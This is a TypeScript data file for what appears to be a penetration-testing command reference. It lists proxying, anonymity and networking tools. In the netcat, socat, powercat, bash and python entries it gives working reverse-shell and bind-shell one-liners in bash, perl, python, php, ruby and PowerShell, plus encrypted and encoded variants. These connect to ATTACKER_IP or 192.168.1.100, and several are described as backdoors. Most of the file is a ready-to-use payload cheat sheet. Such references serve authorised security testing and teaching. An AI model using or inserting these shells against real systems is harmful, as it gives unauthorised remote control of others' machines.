import type { Command } from "./types"

export const utilitiesCommands: Command[] = [
  {
    name: "proxychains",
    description: "Proxy redirection tool",
    explanation: "Forces any TCP connection made by an application to go through a proxy or proxy chain.",
    examples: {
      simple: {
        command: "proxychains nmap -sT -p 80,443 example.com",
        description: "Run an Nmap TCP scan through a proxy.",
      },
      intermediate: {
        command: "proxychains -q firefox",
        description: "Launch Firefox browser through a proxy in quiet mode.",
      },
      advanced: {
        command: "proxychains -f /etc/proxychains-tor.conf ssh user@example.com",
        description: "SSH to a server through a custom proxy configuration.",
      },
    },
    options: [
      {
        name: "f",
        type: "string",
        description: "Config file to use",
        placeholder: "/etc/proxychains.conf",
        common: false,
      },
      {
        name: "q",
        type: "boolean",
        description: "Quiet mode",
        common: true,
      },
      {
        name: "command",
        type: "string",
        description: "Command to execute through proxy",
        placeholder: "nmap -sV 192.168.1.1",
        required: true,
      },
    ],
    documentation: "https://github.com/haad/proxychains",
  },
  {
    name: "tor",
    description: "The Onion Router anonymity network",
    explanation:
      "Enables anonymous communication by directing internet traffic through a free, worldwide overlay network.",
    examples: {
      simple: {
        command: "tor",
        description: "Start the Tor service with default settings.",
      },
      intermediate: {
        command: "tor -f /etc/tor/torrc",
        description: "Start Tor using a specific configuration file.",
      },
      advanced: {
        command:
          'tor --DataDirectory /var/lib/tor --PidFile /var/run/tor/tor.pid --Log "notice file /var/log/tor/notices.log"',
        description: "Start Tor with custom data directory, PID file, and logging configuration.",
      },
    },
    options: [
      {
        name: "f",
        type: "string",
        description: "Config file to use",
        placeholder: "/etc/tor/torrc",
        common: true,
      },
      {
        name: "DataDirectory",
        type: "string",
        description: "Data directory to use",
        placeholder: "/var/lib/tor",
        common: false,
      },
    ],
    documentation: "https://2019.www.torproject.org/docs/documentation.html.en",
  },
  {
    name: "netcat",
    description: "Networking Swiss Army knife",
    explanation:
      "Reads and writes data across network connections using TCP or UDP protocols. Commonly used for creating reverse shells and bind shells.",
    examples: {
      simple: {
        command: "netcat 192.168.1.1 80",
        description: "Connect to a server on port 80.",
      },
      intermediate: {
        command: "netcat -l -p 4444",
        description: "Listen for incoming connections on port 4444.",
      },
      advanced: {
        command: "netcat -l -p 4444 -e /bin/bash",
        description: "Create a simple backdoor that executes bash upon connection.",
      },
    },
    options: [
      {
        name: "l",
        type: "boolean",
        description: "Listen mode",
        common: true,
      },
      {
        name: "p",
        type: "string",
        description: "Local port",
        placeholder: "4444",
        common: true,
      },
      {
        name: "e",
        type: "string",
        description: "Program to execute after connect",
        placeholder: "/bin/bash",
        common: true,
      },
      {
        name: "u",
        type: "boolean",
        description: "Use UDP instead of TCP",
        common: false,
      },
      {
        name: "v",
        type: "boolean",
        description: "Verbose mode",
        common: true,
      },
      {
        name: "n",
        type: "boolean",
        description: "Do not perform DNS lookups",
        common: false,
      },
      {
        name: "z",
        type: "boolean",
        description: "Zero-I/O mode (for scanning)",
        common: false,
      },
      {
        name: "w",
        type: "string",
        description: "Timeout for connects and final net reads",
        placeholder: "5",
        common: false,
      },
      {
        name: "k",
        type: "boolean",
        description: "Keep listening after client disconnects",
        common: true,
      },
      {
        name: "target",
        type: "string",
        description: "Target host",
        placeholder: "192.168.1.1",
        required: true,
      },
      {
        name: "port",
        type: "string",
        description: "Target port",
        placeholder: "80",
        required: true,
      },
    ],
    documentation: "https://linux.die.net/man/1/nc",
    shellExamples: {
      reverseShell: {
        attacker: "nc -lvp 4444",
        victim: {
          bash: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
          perl: 'perl -e \'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
          python:
            'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
          php: 'php -r \'$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
          ruby: 'ruby -rsocket -e\'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
          netcat: "nc ATTACKER_IP 4444 -e /bin/bash",
        },
      },
      bindShell: {
        victim: "nc -lvp 4444 -e /bin/bash",
        attacker: "nc VICTIM_IP 4444",
      },
    },
  },
  {
    name: "socat",
    description: "Multipurpose relay tool",
    explanation:
      "Establishes two bidirectional byte streams and transfers data between them, with many protocol options. More powerful alternative to netcat with encryption support.",
    examples: {
      simple: {
        command: "socat - TCP:192.168.1.1:80",
        description: "Connect to a server on port 80 and relay to standard input/output.",
      },
      intermediate: {
        command: "socat TCP-LISTEN:8080,fork TCP:192.168.1.1:80",
        description: "Create a simple TCP port forwarder from 8080 to a remote server.",
      },
      advanced: {
        command: "socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:192.168.1.1:80",
        description: "Create an SSL/TLS proxy that forwards traffic to a backend server.",
      },
    },
    options: [
      {
        name: "d",
        type: "boolean",
        description: "Increase verbosity",
        common: false,
      },
      {
        name: "dd",
        type: "boolean",
        description: "More verbose output",
        common: false,
      },
      {
        name: "ddd",
        type: "boolean",
        description: "Even more verbose output",
        common: false,
      },
      {
        name: "D",
        type: "boolean",
        description: "Run as daemon in background",
        common: true,
      },
      {
        name: "ly",
        type: "boolean",
        description: "Client-side connection only (no listen)",
        common: false,
      },
      {
        name: "lh",
        type: "string",
        description: "Bind to local host",
        placeholder: "127.0.0.1",
        common: false,
      },
      {
        name: "lp",
        type: "string",
        description: "Bind to local port",
        placeholder: "8080",
        common: false,
      },
      {
        name: "s",
        type: "boolean",
        description: "Syslog facility",
        common: false,
      },
      {
        name: "u",
        type: "boolean",
        description: "Unidirectional mode (left to right)",
        common: false,
      },
      {
        name: "U",
        type: "boolean",
        description: "Unidirectional mode (right to left)",
        common: false,
      },
      {
        name: "v",
        type: "boolean",
        description: "Verbose data traffic, text",
        common: true,
      },
      {
        name: "x",
        type: "boolean",
        description: "Verbose data traffic, hexadecimal",
        common: false,
      },
      {
        name: "source",
        type: "string",
        description: "First address",
        placeholder: "TCP-LISTEN:8080,fork",
        required: true,
      },
      {
        name: "destination",
        type: "string",
        description: "Second address",
        placeholder: "TCP:192.168.1.1:80",
        required: true,
      },
    ],
    documentation: "http://www.dest-unreach.org/socat/doc/socat.html",
    shellExamples: {
      reverseShell: {
        attacker: "socat -d -d TCP-LISTEN:4444 STDOUT",
        victim: "socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
      },
      bindShell: {
        victim: "socat -d -d TCP-LISTEN:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
        attacker: "socat - TCP:VICTIM_IP:4444",
      },
      encryptedReverseShell: {
        setup:
          "openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt && cat server.key server.crt > server.pem",
        attacker: "socat -d -d OPENSSL-LISTEN:4444,cert=server.pem,verify=0 STDOUT",
        victim: "socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
      },
    },
  },
  {
    name: "powercat",
    description: "PowerShell version of netcat",
    explanation: "PowerShell implementation of netcat with additional features for Windows systems.",
    examples: {
      simple: {
        command: "powercat -c 192.168.1.1 -p 80",
        description: "Connect to a server on port 80.",
      },
      intermediate: {
        command: "powercat -l -p 4444",
        description: "Listen for incoming connections on port 4444.",
      },
      advanced: {
        command: "powercat -l -p 4444 -e cmd.exe",
        description: "Create a simple backdoor that executes cmd.exe upon connection.",
      },
    },
    options: [
      {
        name: "l",
        type: "boolean",
        description: "Listen mode",
        common: true,
      },
      {
        name: "c",
        type: "string",
        description: "Connect to remote host",
        placeholder: "192.168.1.1",
        common: true,
      },
      {
        name: "p",
        type: "string",
        description: "Port to connect to or listen on",
        placeholder: "4444",
        common: true,
      },
      {
        name: "e",
        type: "string",
        description: "Program to execute after connect",
        placeholder: "cmd.exe",
        common: true,
      },
      {
        name: "ep",
        type: "boolean",
        description: "Execute PowerShell",
        common: false,
      },
      {
        name: "g",
        type: "boolean",
        description: "Generate payload",
        common: false,
      },
      {
        name: "ge",
        type: "boolean",
        description: "Generate encoded payload",
        common: false,
      },
      {
        name: "d",
        type: "boolean",
        description: "Disconnect after connecting",
        common: false,
      },
      {
        name: "t",
        type: "string",
        description: "Timeout option",
        placeholder: "60",
        common: false,
      },
      {
        name: "i",
        type: "string",
        description: "Input from file",
        placeholder: "input.txt",
        common: false,
      },
      {
        name: "o",
        type: "string",
        description: "Output to file",
        placeholder: "output.txt",
        common: false,
      },
    ],
    documentation: "https://github.com/besimorhino/powercat",
    shellExamples: {
      reverseShell: {
        attacker: "nc -lvp 4444",
        victim: "powercat -c ATTACKER_IP -p 4444 -e cmd.exe",
      },
      bindShell: {
        victim: "powercat -l -p 4444 -e cmd.exe",
        attacker: "nc VICTIM_IP 4444",
      },
      encodedPayload: {
        command: "powercat -c ATTACKER_IP -p 4444 -e cmd.exe -ge",
        usage: "powershell -e <encoded-payload>",
      },
    },
  },
  {
    name: "bash",
    description: "Bourne Again SHell",
    explanation: "Command language interpreter that can be used to create various types of reverse shells.",
    examples: {
      simple: {
        command: "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        description: "Create a reverse shell connection to 192.168.1.100 on port 4444.",
      },
      intermediate: {
        command: "bash -c 'exec bash -i &>/dev/tcp/192.168.1.100/4444 <&1'",
        description: "Alternative reverse shell syntax.",
      },
      advanced: {
        command: "0<&196;exec 196<>/dev/tcp/192.168.1.100/4444; sh <&196 >&196 2>&196",
        description: "Advanced reverse shell using file descriptors.",
      },
    },
    options: [
      {
        name: "i",
        type: "boolean",
        description: "Interactive mode",
        common: true,
      },
      {
        name: "c",
        type: "string",
        description: "Command string to execute",
        placeholder: "command",
        common: true,
      },
      {
        name: "s",
        type: "boolean",
        description: "Read commands from standard input",
        common: false,
      },
      {
        name: "r",
        type: "boolean",
        description: "Restricted shell",
        common: false,
      },
      {
        name: "p",
        type: "boolean",
        description: "Turn on privileged mode",
        common: false,
      },
      {
        name: "host",
        type: "string",
        description: "Target host for reverse shell",
        placeholder: "192.168.1.100",
        required: true,
      },
      {
        name: "port",
        type: "string",
        description: "Target port for reverse shell",
        placeholder: "4444",
        required: true,
      },
    ],
    documentation: "https://www.gnu.org/software/bash/manual/",
    shellExamples: {
      reverseShell: {
        attacker: "nc -lvp 4444",
        victim: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
      },
      alternativeReverseShell: {
        attacker: "nc -lvp 4444",
        victim: "exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done",
      },
      udpReverseShell: {
        attacker: "nc -lvup 4444",
        victim: "sh -i >& /dev/udp/ATTACKER_IP/4444 0>&1",
      },
    },
  },
  {
    name: "python",
    description: "Python programming language",
    explanation: "Versatile programming language that can be used to create reverse shells and other networking tools.",
    examples: {
      simple: {
        command:
          'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        description: "Create a reverse shell connection to 192.168.1.100 on port 4444.",
      },
      intermediate: {
        command:
          'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();subprocess.call(["/bin/sh","-i"],stdin=conn,stdout=conn,stderr=conn)\'',
        description: "Create a bind shell listening on port 4444.",
      },
      advanced: {
        command:
          'python -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
        description: "Create a reverse shell with PTY for better terminal handling.",
      },
    },
    options: [
      {
        name: "c",
        type: "string",
        description: "Command to execute",
        placeholder: "import socket,subprocess,os...",
        common: true,
      },
      {
        name: "m",
        type: "string",
        description: "Module to run as script",
        placeholder: "http.server",
        common: false,
      },
      {
        name: "host",
        type: "string",
        description: "Target host for reverse shell",
        placeholder: "192.168.1.100",
        required: true,
      },
      {
        name: "port",
        type: "string",
        description: "Target port for reverse shell",
        placeholder: "4444",
        required: true,
      },
    ],
    documentation: "https://docs.python.org/",
    shellExamples: {
      reverseShell: {
        attacker: "nc -lvp 4444",
        victim:
          'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
      },
      bindShell: {
        victim:
          'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        attacker: "nc VICTIM_IP 4444",
      },
      ptyShell: {
        attacker: "nc -lvp 4444",
        victim:
          'python -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
      },
    },
  },
]

